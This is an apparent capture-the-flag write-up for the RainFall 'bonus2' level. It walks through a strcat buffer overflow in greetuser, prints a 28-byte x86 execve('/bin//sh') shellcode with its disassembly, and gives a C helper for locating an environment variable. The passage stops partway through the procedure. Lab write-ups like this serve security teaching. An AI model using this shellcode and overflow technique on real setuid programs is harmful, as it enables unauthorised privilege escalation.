
# Preparations

Entering bonus2 home directory we see a bonus2 binary with sticky bit in access rights.
By objdumping the binary we see a main and a greetuser function:

	bonus2@RainFall:~$ objdump -D -M intel-mnemonic bonus2 > /tmp/dump_bon2

Why do we do objdump first? Maybe in this exercise a function exists but is not used so we need to see all the functions.

# Exploitation

We have `strcat` that is unsecure in `greetuser` function. We can use buffer overflow and an environmental variable `LANG` that is used in binary. In a variable there should be a shellcode. We will use the one that was already used - shellcode for linux x86:

    \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

What does it mean:

	Disassembly of section .text:

	08048060 <_start>:
	 8048060: 31 c0                 xor    %eax,%eax
	 8048062: 50                    push   %eax
	 8048063: 68 2f 2f 73 68        push   $0x68732f2f	;'//sh'
	 8048068: 68 2f 62 69 6e        push   $0x6e69622f	;'/bin'
	 804806d: 89 e3                 mov    %esp,%ebx	;copy string (command) address
	 804806f: 89 c1                 mov    %eax,%ecx
	 8048071: 89 c2                 mov    %eax,%edx
	 8048073: b0 0b                 mov    $0xb,%al		;11
	 8048075: cd 80                 int    $0x80		;execve()
	 8048077: 31 c0                 xor    %eax,%eax
	 8048079: 40                    inc    %eax
	 804807a: cd 80                 int    $0x80		;restart_syscall()

Shellcode length is 28 bytes that is very important because we need to count where to put it so that it is executed and does not break the programm.\
We need to use `LANG` environment variable two times to exploit the binary but its address is not changed so it will be found by the helping programm:

    #include <stdio.h>
	#include <stdlib.h>

	int main(int argc, char **argv)
	{
		printf("%s is at %p\n", argv[1], getenv(argv[1]));
	}

And create the variable with shellcode:

	bonus2@RainFall:~$ ls /tmp